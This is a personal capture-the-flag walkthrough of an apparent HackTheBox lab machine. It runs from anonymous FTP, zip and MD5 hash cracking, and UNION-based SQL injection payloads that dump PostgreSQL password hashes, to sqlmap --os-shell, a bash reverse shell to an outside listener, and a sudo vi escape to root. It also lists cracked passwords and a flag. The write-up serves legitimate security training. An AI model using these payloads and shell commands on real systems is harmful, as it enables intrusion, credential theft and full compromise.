I started with basic nmap scan with -sVC settings(version scanning & default scripts)

There was ftp server on port 21 that allows anynomous login. Also there was ssh on port 22 and webserver on 
port 80.

Went in to ftp server with command fpt {target ip} and found file backup.zip but unzipping requires password.
Using command zip2john backup.zip > hash.txt i created hash of the zip file and then let john the ripper do
it's work. Password was 741852963.

Viewing index.php revealed this:  
if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
$_SESSION['login'] = "true";
      header("Location: dashboard.php");
I might be able to bypass login.

I did not find a way to bypass it with SQL injection but I tried to crack password hash with hashcat and it
worked! Cracked password is: qwerty789

Im in with admin:qwerty789 !
Used 1' ORDER BY 6-- to find that query has 5 collumns. 
Found out with: 1' UNION SELECT null, version(), null, null, null-- 
PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2)9.2.1 20191008, 64-bit
 
Looking at the manual tells that with "user" you can find out the current user(postgres). 

1' UNION SELECT null, schema_name, schema_owner , null, null from information_schema.schemata-- 
1' UNION SELECT null, table_name, table_schema, null, null from information_schema.tables where table_schema='pg_catalog'-- 
1' UNION SELECT null, column_name, table_name, table_schema, null from information_schema.columns where table_name='pg_shadow'-- 
1' UNION SELECT null, null, usename, passwd,null from pg_catalog.pg_shadow-- 

postgres	md52d58e0637ec1e94cdfba3d1c26b67d01

After long while I decided to use sqlmap to brute the sql injection. 
sqlmap http://10.129.40.154/dashboard.php?search= --cookie="PHPSESSID=dhr275u36novcnc872bvsvtcai" --os-shell
got me a shell and i uppgraded it with: bash -c "bash -i >& /dev/tcp/10.10.16.21/4444 0>&1" while having listening nc listen to port 4444 with command nc -lvnp 4444

Found user.txt in /var/lib/postgresql (ec9b13ca4d6229cd5cc1e09980965bf7)

Went to /var/www/html and found dashboard.php that contained postgres password:
}
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

I got disconnect few times but I shh'd back in with: ssh postgre@10.129.193.71 and used password from the previous section.

Cmd: sudo -l to see if I have sudo on anything on this account. 
User postgres may run the following commands on vaccine:
 (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell=/bin/sh
:shell 

and now I have root access
